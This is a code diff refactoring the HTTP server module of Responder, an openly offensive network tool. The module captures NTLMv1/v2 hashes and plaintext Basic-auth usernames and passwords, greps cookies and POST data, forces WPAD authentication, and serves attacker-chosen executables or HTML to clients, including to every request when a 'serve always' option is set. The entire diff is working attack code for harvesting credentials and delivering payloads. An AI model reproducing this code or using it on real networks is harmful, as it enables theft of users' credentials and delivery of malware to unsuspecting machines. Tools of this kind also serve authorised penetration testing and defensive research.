@@ -1,3 +1,19 @@
+#!/usr/bin/env python
+# This file is part of Responder
+# Original work by Laurent Gaffie - Trustwave Holdings
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import os
 import struct
 import settings
@@ -8,7 +24,7 @@ from utils import *
 
 from packets import NTLM_Challenge
 from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans
-from packets import WPADScript, ServerExeFile, ServeAlwaysExeFile, ServeAlwaysNormalFile
+from packets import WPADScript, ServeExeFile, ServeHtmlFile
 
 
 # Parse NTLMv1/v2 hash.
@@ -29,16 +45,14 @@ def ParseHTTPHash(data,client):
 		HostNameLen     = struct.unpack('<H',data[46:48])[0]
 		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
 		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		outfile         = os.path.join(settings.Config.ResponderPATH, 'logs', "HTTP-NTLMv1-Client-%s.txt" % client)
 
-		if PrintData(outfile, User+"::"+HostName):
-			print text("[HTTP] NTLMv1 Client   : %s" % client)
-			print text("[HTTP] NTLMv1 Hostname : %s" % HostName)
-			print text("[HTTP] NTLMv1 User     : %s" % User)
-			print text("[HTTP] NTLMv1 Hash     : %s" % LMHash+":"+NTHash)
-			
-			WriteHash = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
-			WriteData(outfile, WriteHash, User+"::"+HostName)
+		print text("[HTTP] NTLMv1 Client   : %s" % client)
+		print text("[HTTP] NTLMv1 Hostname : %s" % HostName)
+		print text("[HTTP] NTLMv1 User     : %s" % User)
+		print text("[HTTP] NTLMv1 Hash     : %s" % LMHash+":"+NTHash)
+		
+		WriteHash = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
+		WriteData(settings.Config.HTTPNTLMv1Log % client, WriteHash, User+"::"+HostName)
 
 	if NthashLen > 24:
 		NthashLen      = 64
@@ -48,16 +62,14 @@ def ParseHTTPHash(data,client):
 		HostNameLen    = struct.unpack('<H',data[44:46])[0]
 		HostNameOffset = struct.unpack('<H',data[48:50])[0]
 		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		outfile        = os.path.join(settings.Config.ResponderPATH, 'logs', "HTTP-NTLMv2-Client-%s.txt" % client)
 		
-		if PrintData(outfile,User+"::"+Domain):
-			print text("[HTTP] NTLMv2 Client   : %s" % client)
-			print text("[HTTP] NTLMv2 Hostname : %s" % HostName)
-			print text("[HTTP] NTLMv2 User     : %s" % Domain+"\\"+User)
-			print text("[HTTP] NTLMv2 Hash     : %s" % NTHash[:32]+":"+NTHash[32:])
-			
-			WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
-			WriteData(outfile,WriteHash, User+"::"+Domain)
+		print text("[HTTP] NTLMv2 Client   : %s" % client)
+		print text("[HTTP] NTLMv2 Hostname : %s" % HostName)
+		print text("[HTTP] NTLMv2 User     : %s" % Domain+"\\"+User)
+		print text("[HTTP] NTLMv2 Hash     : %s" % NTHash[:32]+":"+NTHash[32:])
+		
+		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
+		WriteData(settings.Config.HTTPNTLMv2Log % client, WriteHash, User+"::"+HostName)
 
 def GrabCookie(data,host):
 	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
@@ -88,12 +100,23 @@ def WpadCustom(data, client):
 	else:
 		return False
 
-def ServeEXE(data, client, Filename):
-	print text("[HTTP] Sent file %s to %s" % (Filename, client))
+def ServeFile(Filename):
 	with open (Filename, "rb") as bk:
 		data = bk.read()
 		bk.close()
 		return data
+
+def RespondWithFile(client, filename):
+	
+	if filename.endswith('.exe'):
+		Buffer = ServeExeFile(Payload = ServeFile(filename))
+	else:
+		Buffer = ServeHtmlFile(Payload = ServeFile(filename))
+
+	Buffer.calculate()
+	print text("[HTTP] Sending file %s to %s" % (filename, client))
+
+	return str(Buffer)
 
 def GrabURL(data, host):
 	GET = re.findall('(?<=GET )[^HTTP]*', data)
@@ -109,25 +132,17 @@ def GrabURL(data, host):
 			print text("[HTTP] POST Data: %s" % ''.join(POSTDATA).strip())
 
 # Handle HTTP packet sequence.
-def PacketSequence(data,client):
+def PacketSequence(data, client):
 	NTLM_Auth = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
 	Basic_Auth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
 
-	if settings.Config.Exe_On_Off == True and re.findall('.exe', data):
-		Buffer = ServerExeFile(Payload = ServeEXE(data,client,settings.Config.HtmlFilename),filename=settings.Config.HtmlFilename)
-		Buffer.calculate()
-		return str(Buffer)
+	# Send the .exe if needed
+	if settings.Config.Serve_Always == True or (settings.Config.Serve_Exe == True and re.findall('.exe', data)):
+		return RespondWithFile(client, settings.Config.Exe_Filename)
 
-	if settings.Config.Exec_Mode_On_Off == True:
-		if settings.Config.Exe_Filename.endswith('.exe'):
-			Buffer = ServeAlwaysExeFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename),ContentDiFile=settings.Config.Exe_Filename)
-			Buffer.calculate()
-			return str(Buffer)
-
-		else:
-			Buffer = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename))
-			Buffer.calculate()
-			return str(Buffer)
+	# Send the custom HTML if needed
+	if settings.Config.Serve_Html == True:
+		return RespondWithFile(client, settings.Config.Html_Filename)
 
 	if NTLM_Auth:
 		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
@@ -168,13 +183,10 @@ def PacketSequence(data,client):
 
 		WPAD_Custom = WpadCustom(data,client)
 
-		outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "HTTP-Clear-Text-Password-%s.txt" % client)
-
-		if PrintData(outfile, ClearText_Auth):
-			print text("[HTTP] (Basic) Client       : %s" % client)
-			print text("[HTTP] (Basic) Username     : %s" % ClearText_Auth.split(':')[0])
-			print text("[HTTP] (Basic) Password     : %s" % ClearText_Auth.split(':')[1])
-			WriteData(outfile, ClearText_Auth, ClearText_Auth)
+		print text("[HTTP] (Basic) Client       : %s" % client)
+		print text("[HTTP] (Basic) Username     : %s" % ClearText_Auth.split(':')[0])
+		print text("[HTTP] (Basic) Password     : %s" % ClearText_Auth.split(':')[1])
+		WriteData(settings.Config.HTTPBasicLog % client, ClearText_Auth, ClearText_Auth)
 
 		if settings.Config.Force_WPAD_Auth and WPAD_Custom:
 			print text("[HTTP] WPAD (auth) file sent to %s" % client, 3, 0)
